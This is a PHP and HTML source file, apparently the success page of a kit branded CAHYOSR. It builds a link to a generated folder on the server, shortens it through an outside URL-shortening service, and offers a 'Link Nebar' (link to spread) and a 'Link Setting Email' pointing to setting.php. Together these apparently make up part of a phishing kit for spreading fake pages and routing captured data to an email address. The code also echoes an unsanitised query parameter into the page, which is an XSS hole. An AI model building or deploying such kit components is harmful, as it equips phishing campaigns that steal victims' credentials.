<?php
function shortenURL($longURL) {
    $data = "long_url=$longURL";
    $ch = curl_init('https://mega-xyz.my.id/process.php');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    
    $result = curl_exec($ch);
    curl_close($ch);
    $hasil = json_decode($result, TRUE);
    return $hasil['short_url'];
    }
       
$subdomain = $_GET['folder'];
$domain = $_SERVER['SERVER_NAME'];
$SettingPath = "setting.php";
$UrlPanjang = "https://".$domain."/".$subdomain;
$UrlPanjangDanSetting = "https://".$domain."/".$subdomain."/".$SettingPath;
$short = shortenURL($UrlPanjang);
?>
<html lang="id"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <title>GENERATE SUCCESS</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        body { font-family: 'Orbitron', sans-serif; }
        .neon-cyan { text-shadow: 0 0 20px #67e8f9, 0 0 40px #67e8f9; }
        .glass { background: rgba(15,23,42,0.6); backdrop-filter: blur(20px); border: 1px solid rgba(103,232,249,0.3); }
        .glitch { position:relative; color:#67e8f9; }
        .glitch::before,.glitch::after { content:attr(data-text); position:absolute; top:0; left:0; width:100%; height:100%; }
        .glitch::before { animation:glitch-anim 2s infinite linear alternate-reverse; clip-path:polygon(0 0,100% 0,100% 33%,0 33%); color:#22d3ee; }
        .glitch::after { animation:glitch-anim2 3s infinite linear alternate-reverse; clip-path:polygon(0 67%,100% 67%,100% 100%,0 100%); color:#a5f3fc; }
        @keyframes glitch-anim { 0%{transform:translate(0)} 20%{transform:translate(-3px,3px)} 40%{transform:translate(-3px,-3px)} 60%{transform:translate(3px,3px)} 80%{transform:translate(3px,-3px)} 100%{transform:translate(0)} }
        @keyframes glitch-anim2 { 0%{transform:translate(0)} 25%{transform:translate(4px,2px)} 50%{transform:translate(-2px,-4px)} 75%{transform:translate(2px,4px)} 100%{transform:translate(0)} }
        canvas { mix-blend-mode: screen; }
    </style>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');

    body {
      background-color: #fcfcfc;
      color: #111;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .main-card {
      background: #ffffff;
      border-top: 10px solid #ff0000;
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.12);
      border-radius: 2.5rem;
      max-width: 450px;
      width: 100%;
      padding: 2.5rem;
      border-left: 1px solid #eee;
      border-right: 1px solid #eee;
    }

    .input-box {
      background-color: #f9f9f9;
      border: 1.5px solid #eee;
      color: #000;
      border-radius: 1rem;
      padding: 0.75rem 1rem;
      width: 100%;
      font-size: 0.8rem;
      font-weight: 600;
      margin-bottom: 1rem;
      user-select: all;
      outline: none;
    }

    label {
      display: block;
      font-weight: 800;
      font-size: 10px;
      margin-bottom: 0.5rem;
      color: #ff0000;
      text-transform: uppercase;
      letter-spacing: 1px;
      padding-left: 5px;
    }

    .btn-action {
      transition: all 0.3s ease;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      font-size: 11px;
    }

    .btn-action:active { transform: scale(0.96); }
    .btn-red { background: #ff0000; color: white; }
    .btn-black { background: #000000; color: white; }
    .btn-outline { border: 2px solid #000; color: #000; background: transparent; }

    #toast {
      position: fixed;
      top: 2rem;
      left: 50%;
      transform: translateX(-50%);
      background: #000;
      color: #fff;
      padding: 0.8rem 1.8rem;
      border-radius: 1rem;
      font-weight: 800;
      font-size: 0.75rem;
      display: none;
      z-index: 9999;
      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
    }
  </style>
<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.mx-auto{margin-left:auto;margin-right:auto}.mb-3{margin-bottom:0.75rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.mt-8{margin-top:2rem}.block{display:block}.flex{display:flex}.grid{display:grid}.h-16{height:4rem}.w-16{width:4rem}.w-full{width:100%}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.items-center{align-items:center}.justify-center{justify-content:center}.gap-3{gap:0.75rem}.rounded-2xl{border-radius:1rem}.border{border-width:1px}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.py-4{padding-top:1rem;padding-bottom:1rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-\[10px\]{font-size:10px}.text-\[9px\]{font-size:9px}.font-black{font-weight:900}.font-bold{font-weight:700}.uppercase{text-transform:uppercase}.italic{font-style:italic}.tracking-tighter{letter-spacing:-0.05em}.tracking-widest{letter-spacing:0.1em}.text-black{--tw-text-opacity:1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-xl{--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-red-200{--tw-shadow-color:#fecaca;--tw-shadow:var(--tw-shadow-colored)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.hover\:bg-black:hover{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.hover\:bg-red-600:hover{--tw-bg-opacity:1;background-color:rgb(220 38 38 / var(--tw-bg-opacity, 1))}.hover\:text-white:hover{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}</style></head>
<body class="bg-[#020617] text-cyan-200 overflow-x-hidden">
    <!-- Canvas Background -->
    <canvas id="neuraCanvas" class="fixed inset-0 -z-10 pointer-events-none"></canvas>
  <div id="toast">DISALIN!</div>

<div class="main-card relative z-10">
    <div class="text-center mb-8">
        <div class="w-16 h-16 bg-black text-white rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
          <i class="fas fa-check-double text-red-600 text-2xl"></i>
        </div>
        <h1 style="color:#000;" class="text-2xl font-black italic uppercase tracking-tighter">CAHYO<span class="text-red-600">SR</span></h1>
        <p class="text-gray-400 text-[9px] font-bold uppercase tracking-widest">Generate Success</p>
    </div>

    <div class="mb-6">
      <div>
        <label for="link-nebar">Link Nebar</label>
        <input id="link-nebar" type="text" readonly="" class="input-box" value="<?= $short; ?>">
      </div>
      <div>
        <label for="link-setting">Link Setting Email</label>
        <input id="link-setting" type="text" readonly="" class="input-box" value="<?= $UrlPanjangDanSetting; ?>">
      </div>
      <div>

    <div class="grid grid-cols-1 gap-3">
      <button onclick="window.open(document.getElementById('link-nebar').value, '_blank')" class="btn-action btn-red w-full py-4 rounded-2xl shadow-xl shadow-red-200">
        <i class="fas fa-external-link-alt"></i>
        <span>Open Web</span>
      </button>

      <button onclick="window.location.href='<?= $UrlPanjangDanSetting; ?>'" class="btn-action btn-black w-full py-4 rounded-2xl shadow-xl">
        <i class="fas fa-cog"></i>
        <span>Buka Setting</span>
      </button>

      <button onclick="copyAllData()" class="btn-action bg-gray-100 text-black border border-gray-200 w-full py-4 rounded-2xl hover:bg-black hover:text-white transition-all">
        <i class="fas fa-copy text-red-600"></i>
        <span>Copy All Data</span>
      </button>
    </div>
  </div>

  <script>
    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 2000);
    }

    function copySingle(id) {
      const val = document.getElementById(id).value;
      navigator.clipboard.writeText(val).then(() => {
        showToast("LINK DISALIN!");
      });
    }

    function copyAllData() {
      const nebar = document.getElementById('link-nebar').value;
      const setting = document.getElementById('link-setting').value;
      
      const allText = `Link Nebar: ${nebar}\nLink Setting: ${setting}`;
      
      navigator.clipboard.writeText(allText).then(() => {
        showToast(`SEMUA DATA DISALIN!`);
      });
    }
  </script>
<script>
        // Neural Canvas
        const canvas = document.getElementById('neuraCanvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        let w, h;

        class Particle {
            constructor() {
                this.reset();
            }
            reset() {
                this.x = Math.random() * w;
                this.y = Math.random() * h;
                this.vx = (Math.random() - 0.5) * 0.8;
                this.vy = (Math.random() - 0.5) * 0.8;
                this.size = Math.random() * 2.5 + 1;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > w || this.y < 0 || this.y > h) this.reset();
            }
            draw() {
                ctx.fillStyle = '#67e8f9';
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
        }

        function resize() {
            w = window.innerWidth;
            h = window.innerHeight;
            canvas.width = w;
            canvas.height = h;
        }

        function connect() {
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    let dx = particles[i].x - particles[j].x;
                    let dy = particles[i].y - particles[j].y;
                    let dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < 140) {
                        ctx.strokeStyle = `rgba(103, 232, 249, ${0.25 - dist / 560})`;
                        ctx.lineWidth = 0.8;
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.stroke();
                    }
                }
            }
        }

        function animate() {
            ctx.fillStyle = 'rgba(2, 6, 23, 0.12)';
            ctx.fillRect(0, 0, w, h);
            particles.forEach(p => { p.update(); p.draw(); });
            connect();
            requestAnimationFrame(animate);
        }

        window.addEventListener('resize', resize);
        resize();
        for (let i = 0; i < 180; i++) particles.push(new Particle());
        animate();

        // Smooth scroll
        document.querySelectorAll('a[href^="#"]').forEach(a => {
            a.addEventListener('click', e => {
                e.preventDefault();
                document.querySelector(a.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });
            });
        });
    </script>
<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;06c27f4004f54dd1ae0e7186fae0651b&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>


</div></div></body></html>